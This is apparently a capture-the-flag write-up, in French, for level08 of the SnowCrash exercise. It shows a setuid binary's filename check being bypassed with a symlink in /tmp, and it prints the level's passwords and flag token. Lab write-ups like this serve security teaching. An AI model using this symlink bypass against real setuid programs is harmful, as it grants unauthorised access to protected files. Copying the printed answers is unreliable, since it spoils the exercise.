# Level 08 : found flag08
```bash
ssh level08@192.168.1.37 -p 4242
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          192.168.1.37
level08@192.168.1.37's password: fiumuikeil55xe9cu4dood66h
level08@SnowCrash:~$
```

```bash
level08@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

```bash
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
```

```bash
level08@SnowCrash:~$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff7a4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                                                           = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)                                                       = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```
Le nom du fichier est testé : `strstr("token", "token")`

```bash
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/bal
level08@SnowCrash:~$ ls -la /tmp/bal
lrwxrwxrwx 1 level08 level08 24 Jan 27 19:22 /tmp/bal -> /home/user/level08/token
level08@SnowCrash:~$ ltrace ./level08 /tmp/bal
__libc_start_main(0x8048554, 2, 0xbffff7a4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("/tmp/bal", "token")                                                                        = NULL
open("/tmp/bal", 0, 014435162522)                                                                  = -1
err(1, 0x80487b2, 0xbffff8ce, 0xb7fe765d, 0xb7e3ebaflevel08: Unable to open /tmp/bal: Permission denied
 <unfinished ...>
+++ exited (status 1) +++
```

En créant un lien symbolique, strstr voit une différence, et open résout le lien symbolique.

```bash
level08@SnowCrash:~$ ./level08 /tmp/bal
quif5eloekouj29ke0vouxean
```

```bash
level08@SnowCrash:~$ su flag08
Password: quif5eloekouj29ke0vouxean
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

Documentation :
